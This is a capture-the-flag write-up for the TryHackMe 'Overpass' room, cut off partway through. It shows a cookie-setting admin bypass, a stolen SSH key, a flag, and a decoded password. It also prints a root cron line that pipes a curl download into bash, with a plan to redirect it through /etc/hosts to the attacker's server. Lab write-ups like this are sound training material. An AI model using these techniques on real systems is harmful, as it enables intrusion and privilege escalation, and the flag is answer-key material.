```
room: https://tryhackme.com/room/overpass
Style: Unguided
Difficulty: Easy/Beginner
```
IP : 10.10.134.45

About us Info might be useful (Spoilers; It wasnt.):
```
  Ninja - Lead Developer
  Pars - Shibe Enthusiast and Emotional Support Animal Manager
  Szymex - Head Of Security
  Bee - Chief Drinking Water Coordinator
  MuirlandOracle - Cryptography Consultant
```

I first ran nmap and Gobuster to see if we can find some interesting things. (see /nmap/ folder in Github)

nmap did not give me any results that i cared about, but gobuster revealed some nice locations.
24
Found /admin/ with gobuster

Found Javascript checking if some cookie is set full-stop.

Executing 'Cookies.set("SessionToken",200);' works on getting Admin Access.


We found a SSH key here

```
LINK TO id_rsa
```

Login using this SSH key,

First User Flag
``thm{65c1aaf000506e56996822c6281e6bf7}``

```
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```
Encrypted Password:

`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`

adding this string to .overpass on local system, then running program and asking all passwords produces:

``System 	 saydrawnlyingpicture``

linpeas found something interesting:


* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

This is called by Root, so we can overwrite overpass.thm and serve our own if we have access to /etc/hosts

I overwrite the ip in /etc/hosts with my own and host a webserver serving
